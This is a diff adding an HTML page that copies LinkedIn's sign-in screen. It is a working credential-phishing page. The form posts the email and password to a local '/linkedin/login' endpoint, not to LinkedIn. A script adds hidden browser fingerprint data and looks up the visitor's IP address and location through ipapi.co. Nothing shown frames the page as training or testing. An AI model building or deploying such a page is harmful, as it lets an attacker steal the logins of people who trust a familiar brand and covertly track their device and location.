@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>LinkedIn: Log In or Sign Up</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+         background:#f3f2ef; color:rgba(0,0,0,0.9); min-height:100vh;
+         display:flex; justify-content:center; align-items:center; padding:20px; }
+  .card { width:100%; max-width:400px; background:#fff; border-radius:8px;
+          padding:32px 28px; box-shadow:0 4px 12px rgba(0,0,0,0.15); }
+  .logo { font-size:34px; font-weight:700; color:#0a66c2; text-align:center; margin-bottom:20px; }
+  h1 { font-size:24px; font-weight:600; margin-bottom:6px; }
+  .sub { font-size:14px; color:rgba(0,0,0,0.6); margin-bottom:24px; }
+  label { display:block; font-size:14px; font-weight:500; margin-bottom:6px; }
+  input { width:100%; padding:13px 12px; font-size:15px; border:1px solid rgba(0,0,0,0.6);
+    border-radius:4px; margin-bottom:16px; outline:none; }
+  input:focus { border:2px solid #0a66c2; padding:12px 11px; }
+  .forgot { display:inline-block; color:#0a66c2; font-size:14px; font-weight:600; text-decoration:none; margin-bottom:20px; }
+  .btn { width:100%; background:#0a66c2; color:#fff; border:none; padding:14px;
+    font-size:16px; font-weight:600; border-radius:24px; cursor:pointer; margin-bottom:20px; }
+  .divider { text-align:center; font-size:12px; color:rgba(0,0,0,0.6); margin:20px 0; position:relative; }
+  .divider::before, .divider::after { content:''; position:absolute; top:50%; width:42%; height:1px; background:rgba(0,0,0,0.15); }
+  .divider::before { left:0; } .divider::after { right:0; }
+  .signup { text-align:center; font-size:14px; margin-top:16px; }
+  .signup a { color:#0a66c2; font-weight:600; text-decoration:none; }
+  @media (max-width:500px) { body { align-items:flex-start; padding:10px; } .card { padding:24px 20px; } }
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">LinkedIn</div>
+    <h1>Sign in</h1>
+    <p class="sub">Stay updated on your professional world</p>
+    <form action="/linkedin/login" method="POST" id="login-form">
+      <label>Email or Phone</label>
+      <input type="text" name="email" required>
+      <label>Password</label>
+      <input type="password" name="password" required>
+      <a href="#" class="forgot">Forgot password?</a>
+      <button type="submit" class="btn">Sign in</button>
+      <input type="hidden" name="ip_address" id="ip-address">
+      <input type="hidden" name="geo_location" id="geo-location">
+      <input type="hidden" name="device_type" id="device-type">
+      <input type="hidden" name="browser_info" id="browser-info">
+      <input type="hidden" name="os_info" id="os-info">
+      <input type="hidden" name="screen_resolution" id="screen-resolution">
+      <input type="hidden" name="timezone" id="timezone">
+      <input type="hidden" name="language" id="language">
+    </form>
+    <div class="divider">or</div>
+    <div class="signup">New to LinkedIn? <a href="#">Join now</a></div>
+  </div>
+<script>
+async function collectFingerprint() {
+  const ua = navigator.userAgent;
+  document.getElementById('browser-info').value = ua;
+  document.getElementById('os-info').value = navigator.platform;
+  document.getElementById('device-type').value = /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? 'Mobile' : 'Desktop';
+  document.getElementById('screen-resolution').value = `${window.screen.width}x${window.screen.height}`;
+  document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  document.getElementById('language').value = navigator.language;
+  try {
+    const res = await fetch('https://ipapi.co/json/');
+    const d = await res.json();
+    if (d.ip) {
+      document.getElementById('ip-address').value = d.ip;
+      document.getElementById('geo-location').value = [d.city, d.region, d.country_name].filter(Boolean).join(', ');
+    }
+  } catch(e) {}
+}
+document.addEventListener('DOMContentLoaded', () => {
+  collectFingerprint();
+  const form = document.getElementById('login-form');
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    await collectFingerprint();
+    form.submit();
+  });
+});
+</script>
+</body>
+</html>
